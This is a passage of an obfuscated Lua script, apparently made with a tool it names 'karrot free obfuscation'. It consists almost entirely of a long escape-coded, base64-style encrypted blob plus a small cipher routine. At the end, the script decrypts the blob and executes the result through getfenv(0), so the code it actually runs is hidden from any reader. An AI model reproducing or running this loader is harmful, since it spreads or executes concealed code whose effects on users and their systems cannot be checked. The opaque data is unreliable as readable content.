103\115\80\104\100\90\99\77\85\69\90\56\47\49\116\118\74\74\52\115\103\98\81\54\72\70\122\115\65\117\85\85\70\82\87\81\72\89\51\105\114\54\114\122\66\87\101\69\121\43\48\98\102\108\55\76\75\105\82\117\102\76\68\105\112\86\111\57\89\49\113\55\49\114\77\97\105\67\66\79\117\106\119\47\103\75\57\111\84\101\80\79\108\70\119\80\106\105\75\83\82\109\97\104\102\103\49\121\105\53\109\97\112\69\65\115\107\104\103\117\49\119\74\50\102\86\86\89\50\43\80\112\107\89\115\48\98\122\52\78\86\88\66\55\114\55\114\54\122\53\102\102\80\117\69\121\48\112\83\53\69\72\51\107\76\100\72\88\53\56\86\68\103\71\122\51\86\122\88\78\117\100\87\51\90\48\72\111\102\47\65\70\90\111\66\55\107\122\73\104\87\57\54\103\122\49\119\90\51\115\120\79\81\53\70\50\111\74\85\99\67\83\77\116\104\69\111\117\72\86\90\69\78\57\79\102\112\43\65\49\75\74\106\99\89\104\119\103\120\83\70\49\110\50\113\81\111\78\70\113\117\54\53\65\111\104\108\75\74\79\76\84\76\102\85\112\98\70\72\73\102\47\113\108\97\119\70\110\47\53\122\85\97\79\109\54\97\102\98\77\100\50\107\97\111\118\74\81\90\52\81\80\68\81\119\52\119\77\115\55\104\47\102\115\47\54\52\121\121\69\114\51\71\81\68\85\71\51\65\54\71\48\88\110\78\85\111\47\72\53\116\73\78\99\88\80\113\107\69\103\86\106\75\53\117\113\57\76\48\113\102\107\116\114\72\70\107\97\49\86\86\120\48\111\65\75\111\120\68\109\73\86\112\122\104\53\77\74\76\114\56\55\112\110\86\81\107\121\72\66\69\66\104\83\84\48\105\122\112\109\103\115\51\112\112\43\104\75\105\78\121\88\82\109\73\105\121\106\100\89\122\78\107\52\43\77\50\99\49\76\107\57\47\69\56\112\113\57\72\47\49\86\90\86\116\100\52\68\110\97\43\83\118\100\89\83\48\120\55\83\81\77\81\117\116\87\97\75\55\121\105\72\72\83\49\105\88\111\90\73\55\56\72\87\54\121\69\80\79\118\98\68\52\103\111\80\80\86\99\117\97\105\121\83\87\100\48\107\86\82\47\88\109\105\51\77\83\51\67\89\99\84\82\103\88\49\72\85\72\47\119\70\100\122\53\107\50\77\51\99\81\88\56\55\57\103\86\70\74\77\54\65\47\105\81\71\112\120\51\115\84\75\71\115\100\69\55\108\111\74\117\70\74\89\88\100\43\118\51\110\78\119\83\81\78\100\77\66\87\114\49\99\114\75\86\120\87\77\111\85\116\82\122\72\107\105\116\69\72\114\77\50\83\55\76\65\108\114\80\76\113\88\71\108\69\73\51\118\56\43\112\81\75\122\99\85\118\74\78\82\76\98\71\50\117\71\122\85\107\105\116\98\74\113\77\75\49\51\121\55\75\111\76\87\88\66\108\51\49\86\56\100\112\121\79\47\69\108\70\98\110\98\109\103\112\43\49\82\89\52\119\74\54\115\100\66\43\97\76\120\84\89\85\57\50\98\90\49\88\68\108\66\87\97\73\90\52\113\120\49\113\47\88\111\110\114\67\106\67\82\88\113\109\113\82\47\66\68\105\83\72\105\100\117\85\71\49\85\111\47\56\49\107\121\71\113\47\121\54\55\78\79\111\77\71\121\69\84\57\74\90\88\100\108\121\47\121\66\73\121\47\110\105\86\85\89\57\55\75\71\43\88\72\80\70\78\70\88\66\119\81\101\121\103\81\73\81\82\74\71\112\122\73\122\86\97\65\82\49\98\56\100\101\120\54\48\80\51\70\49\85\76\88\54\66\49\102\57\90\67\102\51\56\67\87\117\53\113\49\68\75\87\97\72\98\111\108\119\115\90\71\75\70\78\79\101\83\106\118\55\70\75\117\111\121\72\100\107\103\113\71\116\81\80\67\111\82\81\118\65\56\90\89\89\55\66\121\51\88\118\114\80\82\80\109\70\85\88\107\52\78\69\97\54\108\104\75\87\53\71\90\55\57\67\89\53\88\66\56\116\70\49\110\49\65\78\109\65\84\85\76\107\43\104\102\78\74\83\81\117\113\53\76\48\52\106\51\86\101\56\51\70\116\56\107\52\110\55\67\104\71\53\67\122\72\116\83\56\54\98\48\105\54\57\87\98\115\106\106\57\80\120\100\73\108\117\99\53\70\52\103\54\85\85\65\82\55\71\49\103\57\115\110\49\100\111\73\43\85\97\51\80\120\67\66\84\89\57\85\55\76\102\49\81\52\83\55\54\82\78\85\54\83\56\116\122\102\48\114\53\56\79\101\68\74\118\52\78\73\71\113\99\43\117\85\70\118\98\48\52\74\115\109\122\68\90\106\77\107\115\87\112\108\119\99\84\113\108\53\49\121\75\119\110\43\119\83\105\70\122\68\83\67\43\107\71\105\116\103\98\75\101\112\114\121\69\80\109\82\48\74\108\67\72\122\98\77\68\73\83\115\55\57\69\67\113\84\107\51\71\85\81\111\101\66\65\104\56\116\107\100\97\86\76\99\55\106\119\50\98\80\115\98\112\121\99\81\117\101\50\73\86\69\102\106\51\89\74\116\113\98\83\102\65\74\103\116\82\56\87\118\77\55\85\111\100\65\103\115\106\105\90\90\122\55\100\74\88\105\66\52\98\86\49\120\85\65\97\101\49\69\73\49\55\110\53\48\114\78\85\73\85\120\52\104\76\100\52\68\110\83\121\97\101\86\109\113\54\102\78\69\84\67\104\85\105\49\66\118\77\74\65\77\102\108\101\71\83\121\52\108\119\68\52\77\98\55\90\71\71\109\49\54\89\115\81\105\80\109\110\80\120\70\103\77\82\73\53\87\97\114\86\114\121\69\68\105\102\118\77\86\56\101\104\121\107\106\83\98\81\69\53\53\47\85\121\101\88\116\84\51\102\118\43\84\120\72\77\121\117\43\43\108\79\65\97\88\121\107\67\69\100\73\78\97\52\72\50\107\118\78\115\86\68\106\109\114\89\79\98\73\99\48\74\102\105\48\122\83\98\105\120\118\57\76\75\99\101\97\106\82\84\109\80\66\53\104\77\115\85\51\50\80\104\73\82\56\43\82\74\120\83\75\65\61\61";local karrotlIIllIll='\97\121\107\116\88\49\78\108\75\108\112\53\99\106\86\111\100\106\111\114\78\107\66\79\77\119\61\61';local karrotlIIllIII='NGI2d3Q8YSp3KmsvYWc9K0c6dw==';local karrotlIIlIIlI=function(a,b)local c=karrotlIIlIlIl(karrotlIIlIllI(a))local d=c["\99\105\112\104\101\114"](c,karrotlIIlIllI(b))return karrotlIIlIllI(d)end;local karrotlIIllIll='\97\121\107\116\88\49\78\108\75\108\112\53\99\106\86\111\100\106\111\114\78\107\66\79\77\119\61\61';local karrotlIIllIll='\97\121\107\116\88\49\78\108\75\108\112\53\99\106\86\111\100\106\111\114\78\107\66\79\77\119\61\61';local karrotlIIllIIl='\107\97\114\114\111\116\32\102\114\101\101\32\111\98\102\117\115\99\97\116\105\111\110';local karrotlIIlIIII='OS5nRkJxRlY8XydZaSZ2OXdEb3t7I2EkNmcvbyxdZVYvZy86Mjg=';function karrotlIIlIlll(a,b)local c=karrotlIIlIllI(a,b);local d=karrotlIIllIlI;return c,d end;return karrotlIIlIlII(karrotlIIlIIlI(karrotlIIllIll,karrotlIIlIIIl),getfenv(0))()end)()
